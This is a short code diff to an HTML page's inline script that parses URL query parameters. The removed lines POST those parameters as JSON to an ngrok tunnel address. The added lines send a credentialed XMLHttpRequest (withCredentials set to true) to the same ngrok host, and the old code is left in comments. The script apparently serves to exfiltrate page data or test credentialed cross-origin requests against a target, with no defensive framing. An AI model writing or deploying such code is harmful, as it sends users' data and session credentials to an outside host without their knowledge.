@@ -19,21 +19,25 @@
             while (match = search.exec(query))
                 urlParams[decode(match[1])] = decode(match[2]);
         })();
-        const data = urlParams;
-        fetch('https://ca1d-45-85-144-53.ngrok.io', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(data),
-        })
-            .then((response) => response.json())
-            .then((data) => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+        const req = new XMLHttpRequest();
+        req.open("GET", 'https://ca1d-45-85-144-53.ngrok.io', true);
+        req.withCredentials = true;
+        req.send(null);
+        // const data = ;
+        // fetch('https://ca1d-45-85-144-53.ngrok.io', {
+        //     method: 'POST',
+        //     headers: {
+        //         'Content-Type': 'application/json',
+        //     },
+        //     body: JSON.stringify(data),
+        // })
+        //     .then((response) => response.json())
+        //     .then((data) => {
+        //         console.log('Success:', data);
+        //     })
+        //     .catch((error) => {
+        //         console.error('Error:', error);
+        //     });
     }
 </script>
 </body>
